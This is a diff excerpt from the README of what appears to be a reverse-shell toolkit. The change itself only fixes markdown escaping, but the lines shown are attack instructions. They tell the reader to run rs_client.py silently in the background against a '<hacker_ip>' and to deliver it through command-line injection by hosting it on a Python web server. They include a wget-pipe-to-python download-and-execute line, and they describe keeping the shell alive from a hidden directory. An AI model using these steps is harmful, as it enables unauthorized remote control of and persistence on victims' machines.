@@ -14,15 +14,15 @@ Or pass them in as an argumenta (default port 8000)
 Or run as a backgroud job
 `nohup python3 rs_client.py <hacker_ip> &> /dev/null &`
 
-## Indirect Client Deployment \[PREFERRED\]
+## Indirect Client Deployment [PREFERRED]
 (works with cmd line injection)
 
-- \[SERVER\] Host rs_client.py somehere
+- [SERVER] Host rs_client.py somehere
 - - One option is to start a python web server on the rs_server
 - - `python3 -m http.server 8080`   
-- \[CLIENT]\ Download + Execute from client machine
+- [CLIENT] Download + Execute from client machine
 - - `wget -O - <host:port/rs_client.py> | python3`
-- \[SERVER\] Download + Execute the Infinite shell (keeps rs_client active if it disconnects)
+- [SERVER] Download + Execute the Infinite shell (keeps rs_client active if it disconnects)
 - - Follow these steps once server is connected to client.
 - - Navigate to specific dir or Make a hidden dir
 - - - `cd /usr/bin/local`  
